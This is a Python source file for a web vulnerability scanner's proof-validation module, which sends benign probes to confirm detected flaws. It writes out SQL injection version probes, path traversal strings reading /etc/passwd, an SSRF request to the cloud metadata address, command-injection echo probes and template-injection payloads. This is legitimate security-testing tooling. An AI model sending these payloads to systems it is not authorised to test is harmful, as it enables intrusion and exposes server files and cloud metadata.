"""
ProofValidator — turns initial vulnerability detections into CONFIRMED findings.

Takes a fuzzer detection (e.g. "error-based SQLi detected") and attempts to
extract concrete proof: DB version strings, reflected markers, file contents,
redirect chains, evaluated template expressions, etc.

Every proof method uses SAFE/BENIGN payloads only — no destructive commands,
no data modification, no exfiltration beyond version strings and markers we
control.

Usage:
    validator = ProofValidator(session=session, timeout=10)
    label, data = validator.validate(
        vuln_type="sqli_error", surface=surface,
        url=url, payload=payload, resp=resp,
    )
    if label:
        print(f"CONFIRMED: {label} — {data}")
"""
from __future__ import annotations

import json
import logging
import random as _random
import re
import time
import uuid
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
import requests.exceptions

log = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════════════════════
# DB version extraction patterns
# ══════════════════════════════════════════════════════════════════════════════

_DB_VERSION_RE = re.compile(
    r"(?:MySQL|MariaDB|PostgreSQL|SQLite|Microsoft SQL Server)"
    r"[^0-9]{0,20}?"
    r"(\d+\.\d+[\.\d]*)",
    re.IGNORECASE,
)

_VERSION_PLAIN_RE = re.compile(r"(\d+\.\d+(?:\.\d+)+)")

_DB_KEYWORDS = ("mysql", "mariadb", "postgresql", "sqlite", "microsoft sql server")

# SQLi proof payloads — safe read-only version extraction
_SQLI_PROBES: list[tuple[str, str]] = [
    ("' UNION SELECT @@version-- -",              "MySQL"),
    ("' AND 1=CONVERT(int,@@version)-- -",        "MSSQL"),
    ("' UNION SELECT version()-- -",              "PostgreSQL"),
    ("' UNION SELECT sqlite_version()-- -",       "SQLite"),
]

# Path traversal payloads — read-only known files
_LFI_PROBES = [
    "../../../../etc/hostname",
    "../../../../etc/passwd",
    "....//....//....//etc/hostname",
]

# SSTI payloads — harmless math evaluation
# Randomized per-process to avoid false positives from pages containing "49"
_ssti_a, _ssti_b = _random.randint(100, 999), _random.randint(100, 999)
_ssti_product    = str(_ssti_a * _ssti_b)
_SSTI_PROBES: list[tuple[str, str, str]] = [
    (f"{{{{{_ssti_a}*{_ssti_b}}}}}",       _ssti_product, "Jinja2/Twig"),
    (f"${{{_ssti_a}*{_ssti_b}}}",          _ssti_product, "FreeMarker/Mako"),
    (f"<%= {_ssti_a}*{_ssti_b} %>",        _ssti_product, "ERB/EJS"),
    (f"#{{{_ssti_a}*{_ssti_b}}}",          _ssti_product, "Slim/Pug"),
    ("{{7*'7'}}",                           "7777777",     "Jinja2-string-mul"),
]


# ══════════════════════════════════════════════════════════════════════════════
# ProofValidator
# ══════════════════════════════════════════════════════════════════════════════

class ProofValidator:
    """Attempts to prove a detected vulnerability with concrete evidence."""

    def __init__(
        self,
        session: requests.Session,
        timeout: int = 10,
        scan_id: str | None = None,
    ):
        self.session = session
        self.timeout = timeout
        self.scan_id = scan_id or uuid.uuid4().hex[:8]

    # ── Public dispatcher ────────────────────────────────────────────────────

    def validate(
        self,
        vuln_type: str,
        surface,
        url: str,
        payload: str,
        resp: requests.Response,
        **kwargs,
    ) -> tuple[str | None, str | None]:
        """
        Route to the appropriate prove_* method based on vuln_type.

        Returns (proof_label, proof_data) on success, (None, None) on failure.
        """
        dispatch: dict[str, callable] = {
            "sqli_error":      lambda: self.prove_sqli(surface, url, resp),
            "sqli_bool_true":  lambda: self.prove_sqli(surface, url, resp),
            "sqli_blind_time": lambda: self.prove_sqli(surface, url, resp),
            "xss_reflected":   lambda: self.prove_xss_reflected(surface, url, payload),
            "xss_stored":      lambda: self.prove_xss_stored(surface, url, payload),
            "ssrf":            lambda: self.prove_ssrf(surface, url, payload, oast=kwargs.get("oast")),
            "lfi":             lambda: self.prove_path_traversal(surface, url, payload),
            "open_redirect":   lambda: self.prove_open_redirect(surface, url, resp),
            "cmdi":            lambda: self.prove_cmdi(surface, url, payload),
            "ssti":            lambda: self.prove_ssti(surface, url, payload),
            "nosql_injection": lambda: self.prove_nosql(resp),
            "jwt_confusion":   lambda: self.prove_jwt_confusion(resp, payload),
            "cache_poisoning": lambda: self.prove_cache_poisoning(resp, payload),
            "mass_assignment": lambda: self.prove_mass_assignment(resp, payload),
            "hpp":             lambda: self.prove_hpp(resp, payload),
            "xxe":             lambda: self.prove_xxe(resp),
            "deserialization": lambda: self.prove_deserialization(resp),
        }

        handler = dispatch.get(vuln_type)
        if handler is None:
            log.debug("No proof handler for vuln_type=%s", vuln_type)
            return None, None

        try:
            return handler()
        except Exception:
            log.debug("Proof validation failed for %s at %s", vuln_type, url, exc_info=True)
            return None, None

    # ── Proof methods ────────────────────────────────────────────────────────

    def prove_sqli(self, surface, url: str, resp: requests.Response) -> tuple[str | None, str | None]:
        """Attempt to extract DB version via UNION/error-based probes."""
        for probe_payload, db_hint in _SQLI_PROBES:
            probe_resp = self._send_proof(surface, probe_payload)
            if probe_resp is None:
                continue

            body = probe_resp.text

            # Try structured version pattern near DB keywords
            m = _DB_VERSION_RE.search(body)
            if m:
                db_name = m.group(0).split(m.group(1))[0].strip().rstrip(" /:-")
                version = m.group(1)
                proof_data = f"{db_name} {version}"
                return "SQLi CONFIRMED \u2014 DB version extracted", proof_data

            # Fallback: if any DB keyword present and a version string nearby
            body_lower = body.lower()
            for kw in _DB_KEYWORDS:
                if kw in body_lower:
                    vm = _VERSION_PLAIN_RE.search(body)
                    if vm:
                        proof_data = f"{kw.title()} {vm.group(1)}"
                        return "SQLi CONFIRMED \u2014 DB version extracted", proof_data

        return None, None

    def prove_xss_reflected(self, surface, url: str, payload: str) -> tuple[str | None, str | None]:
        """Inject a benign marker and check if it reflects unencoded."""
        marker = f"<asura-xss-{self.scan_id}>"
        resp = self._send_proof(surface, marker)
        if resp is None:
            return None, None

        body = resp.text
        if marker in body:
            context = self._extract_context(body, marker, window=100)
            return "Reflected XSS CONFIRMED \u2014 marker reflected unencoded", context

        return None, None

    def prove_xss_stored(self, surface, url: str, payload: str) -> tuple[str | None, str | None]:
        """Inject a benign marker via POST, then GET to check persistence."""
        marker = f"<asura-stored-{self.scan_id}>"

        # POST the marker
        post_resp = self._send_proof(surface, marker)
        if post_resp is None:
            return None, None

        # GET the same URL to check persistence
        try:
            get_resp = self.session.get(
                surface.url, timeout=self.timeout, verify=False,
            )
        except Exception:
            return None, None

        body = get_resp.text
        if marker in body:
            context = self._extract_context(body, marker, window=100)
            return "Stored XSS CONFIRMED \u2014 marker persisted in page", context

        return None, None

    def prove_ssrf(
        self, surface, url: str, payload: str, oast=None,
    ) -> tuple[str | None, str | None]:
        """Prove SSRF via OAST callback or AWS metadata endpoint."""
        # Path 1: OAST out-of-band callback
        if oast is not None:
            try:
                callback_url = oast.generate_url()
                self._send_proof(surface, callback_url)
                time.sleep(5)
                if oast.has_callback(callback_url):
                    details = oast.get_callback_details(callback_url)
                    return (
                        "SSRF CONFIRMED \u2014 out-of-band callback received",
                        str(details)[:200],
                    )
            except Exception:
                log.debug("OAST SSRF proof failed", exc_info=True)

        # Path 2: AWS metadata endpoint (safe — read-only cloud metadata)
        metadata_url = "http://169.254.169.254/latest/meta-data/"
        resp = self._send_proof(surface, metadata_url)
        if resp is None:
            return None, None

        body = resp.text
        # AWS metadata responses contain known keys
        metadata_indicators = ("ami-id", "instance-id", "hostname", "local-ipv4", "iam")
        if any(indicator in body.lower() for indicator in metadata_indicators):
            return (
                "SSRF CONFIRMED \u2014 internal metadata accessed",
                body[:64],
            )

        return None, None

    def prove_nosql(self, resp: requests.Response) -> tuple[str | None, str | None]:
        """Confirm NoSQL injection from database/operator parser signals."""
        body = resp.text if getattr(resp, "text", None) else ""
        patterns = (
            r"Mongo(ServerError|Error)|BSON(Type)?Error",
            r"unknown top level operator|unknown operator",
            r"PlanExecutor error during aggregation",
            r"Cannot use \$where|\$where is not allowed",
        )
        for pattern in patterns:
            match = re.search(pattern, body, re.I)
            if match:
                return "NoSQL Injection CONFIRMED - database operator signal exposed", self._extract_context(body, match.group(0), 120)
        return None, None

    def prove_jwt_confusion(self, resp: requests.Response, payload: str) -> tuple[str | None, str | None]:
        """Confirm JWT key-source or algorithm confusion from validation behavior."""
        body = resp.text if getattr(resp, "text", None) else ""
        combined = f"{payload}\n{body}"
        patterns = (
            r"JWKS.*(?:not found|invalid|fetch|resolve)",
            r"jku.*(?:not allowed|invalid|blocked|fetch)",
            r"kid.*(?:path|traversal|not found|open|invalid)",
            r"algorithm.*(?:confusion|none|mismatch|not allowed)",
        )
        for pattern in patterns:
            match = re.search(pattern, combined, re.I | re.S)
            if match:
                return "JWT Confusion CONFIRMED - token key/algorithm handling exposed", match.group(0)[:200]
        return None, None

    def prove_cache_poisoning(self, resp: requests.Response, payload: str) -> tuple[str | None, str | None]:
        """Confirm cache poisoning when tainted cache headers or cache-hit signals appear."""
        headers = {str(k).lower(): str(v) for k, v in getattr(resp, "headers", {}).items()}
        body = resp.text if getattr(resp, "text", None) else ""
        cache_headers = {
            "x-cache": headers.get("x-cache", ""),
            "cf-cache-status": headers.get("cf-cache-status", ""),
            "age": headers.get("age", ""),
            "x-served-by": headers.get("x-served-by", ""),
        }
        hit_signal = any(re.search(r"\bHIT\b", value, re.I) for value in cache_headers.values())
        age_signal = bool(cache_headers["age"].isdigit())
        reflected_taint = "dast-cache" in body.lower() or "dast-cache" in "\n".join(headers.values()).lower()
        if hit_signal or age_signal or reflected_taint:
            evidence = "; ".join(f"{k}: {v}" for k, v in cache_headers.items() if v)
            return "Cache Poisoning CONFIRMED - shared cache signal observed", evidence or payload[:200]
        return None, None

    def prove_mass_assignment(self, resp: requests.Response, payload: str) -> tuple[str | None, str | None]:
        """Confirm mass assignment when privileged fields survive in the response."""
        body = resp.text if getattr(resp, "text", None) else ""
        accepted_fields = (
            r'"is_admin"\s*:\s*true',
            r'"role"\s*:\s*"admin"',
            r'"permissions"\s*:\s*\[\s*"\*"\s*\]',
            r'"tenant_id"\s*:\s*"attacker',
            r'"mfa_enabled"\s*:\s*false',
        )
        for pattern in accepted_fields:
            match = re.search(pattern, body, re.I)
            if match:
                return "Mass Assignment CONFIRMED - privileged field accepted", match.group(0)
        if payload and payload in body:
            return "Mass Assignment CONFIRMED - injected object field reflected", payload[:200]
        return None, None

    def prove_hpp(self, resp: requests.Response, payload: str) -> tuple[str | None, str | None]:
        """Confirm HTTP parameter pollution from duplicate key behavior."""
        body = resp.text if getattr(resp, "text", None) else ""
        duplicate_keys = re.findall(r"([A-Za-z0-9_.-]+)=", payload)
        if len(duplicate_keys) != len(set(duplicate_keys)) and re.search(r"\b(admin|0|attacker|evil)\b", body, re.I):
            return "HTTP Parameter Pollution CONFIRMED - duplicate parameter changed behavior", body[:200]
        return None, None

    def prove_xxe(self, resp: requests.Response) -> tuple[str | None, str | None]:
        """Confirm XXE from file content or XML parser external-entity signals."""
        body = resp.text if getattr(resp, "text", None) else ""
        patterns = (
            r"root:x:0:0:",
            r"xxe-test-marker",
            r"failed to load external entity|external entity",
            r"DOCTYPE is disallowed|DTD is prohibited",
        )
        for pattern in patterns:
            match = re.search(pattern, body, re.I)
            if match:
                return "XXE CONFIRMED - external entity processing signal observed", self._extract_context(body, match.group(0), 120)
        return None, None

    def prove_deserialization(self, resp: requests.Response) -> tuple[str | None, str | None]:
        """Confirm unsafe deserialization from parser/class binding errors."""
        body = resp.text if getattr(resp, "text", None) else ""
        patterns = (
            r"StreamCorruptedException|InvalidClassException|NotSerializableException",
            r"SerializationException|JsonMappingException.*@type",
            r"pickle\.UnpicklingError|yaml\.constructor\.ConstructorError",
            r"fastjson|ysoserial|gadget chain",
        )
        for pattern in patterns:
            match = re.search(pattern, body, re.I | re.S)
            if match:
                return "Deserialization CONFIRMED - object parser signal exposed", self._extract_context(body, match.group(0), 120)
        return None, None

    def prove_path_traversal(self, surface, url: str, payload: str) -> tuple[str | None, str | None]:
        """Read known system files to confirm path traversal."""
        for probe in _LFI_PROBES:
            resp = self._send_proof(surface, probe)
            if resp is None:
                continue

            body = resp.text

            # /etc/passwd signature
            if re.search(r"root:", body):
                return (
                    "Path Traversal CONFIRMED \u2014 file content extracted",
                    body[:64],
                )

            # /etc/hostname — any non-HTML single-line content
            stripped = body.strip()
            if (
                stripped
                and "<" not in stripped[:64]
                and len(stripped.splitlines()) <= 3
                and len(stripped) < 256
            ):
                return (
                    "Path Traversal CONFIRMED \u2014 file content extracted",
                    stripped[:64],
                )

        return None, None

    def prove_open_redirect(self, surface, url: str, resp: requests.Response) -> tuple[str | None, str | None]:
        """Follow redirect chain manually, log each hop."""
        hops: list[str] = [url]
        current_resp = resp
        original_host = urlparse(url).hostname

        for _ in range(5):
            location = current_resp.headers.get("Location")
            if not location:
                break

            # Resolve relative redirects
            if not location.startswith(("http://", "https://")):
                from urllib.parse import urljoin
                location = urljoin(hops[-1], location)

            hops.append(location)

            # Check if redirected to external domain
            redirect_host = urlparse(location).hostname
            if redirect_host and redirect_host != original_host:
                chain = " -> ".join(hops)
                return (
                    "Open Redirect CONFIRMED \u2014 redirect chain to external domain",
                    chain,
                )

            # Follow the redirect
            try:
                current_resp = self.session.get(
                    location, timeout=self.timeout, verify=False,
                    allow_redirects=False,
                )
            except Exception:
                break

        return None, None

    def prove_cmdi(self, surface, url: str, payload: str) -> tuple[str | None, str | None]:
        """Execute a harmless echo and check if marker appears in response."""
        marker = f"asura-{self.scan_id}"
        cmdi_probes = [
            f"; echo {marker}",
            f"| echo {marker}",
            f"$(echo {marker})",
            f"`echo {marker}`",
        ]

        for probe in cmdi_probes:
            resp = self._send_proof(surface, probe)
            if resp is None:
                continue

            body = resp.text
            if marker in body:
                context = self._extract_context(body, marker, window=100)
                return "Command Injection CONFIRMED \u2014 echo marker reflected", context

        return None, None

    def prove_ssti(self, surface, url: str, payload: str) -> tuple[str | None, str | None]:
        """Evaluate harmless math expressions via template engines."""
        for probe, expected, engine in _SSTI_PROBES:
            resp = self._send_proof(surface, probe)
            if resp is None:
                continue

            body = resp.text
            if expected in body and probe not in body:
                return (
                    "SSTI CONFIRMED \u2014 template expression evaluated",
                    f"Input: {probe}, Output: {expected} (engine: {engine})",
                )

        return None, None

    # ── Helper methods ───────────────────────────────────────────────────────

    def _send_proof(self, surface, payload_value: str) -> requests.Response | None:
        """
        Build and send a proof request using the surface context.

        Handles query, form, json, header, and path param types.
        """
        url = self._build_url(surface, payload_value)
        body = self._build_body(surface, payload_value)
        headers = self._build_headers(surface, payload_value)

        try:
            return self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception:
            log.debug("Proof request failed: %s %s", surface.method, url, exc_info=True)
            return None

    def _build_url(self, surface, payload: str) -> str:
        from .insertion_point import from_input_surface
        url, _, _ = from_input_surface(surface).build_http_request(payload)
        return url

    def _build_body(self, surface, payload: str) -> str | None:
        from .insertion_point import from_input_surface
        _, _, body = from_input_surface(surface).build_http_request(payload)
        return body

    def _build_headers(self, surface, payload: str) -> dict:
        from .insertion_point import from_input_surface
        _, headers, _ = from_input_surface(surface).build_http_request(payload)
        # Preserve content-type hints that AuditInsertionPoint doesn't infer from surface alone
        if surface.param_type == "json" and "Content-Type" not in headers:
            headers["Content-Type"] = "application/json"
        elif surface.param_type == "form" and "Content-Type" not in headers:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        return headers

    def _extract_context(self, text: str, marker: str, window: int = 100) -> str:
        """Find marker in text and return surrounding context (up to 200 chars)."""
        idx = text.find(marker)
        if idx == -1:
            return ""
        start = max(0, idx - window)
        end = min(len(text), idx + len(marker) + window)
        return text[start:end]
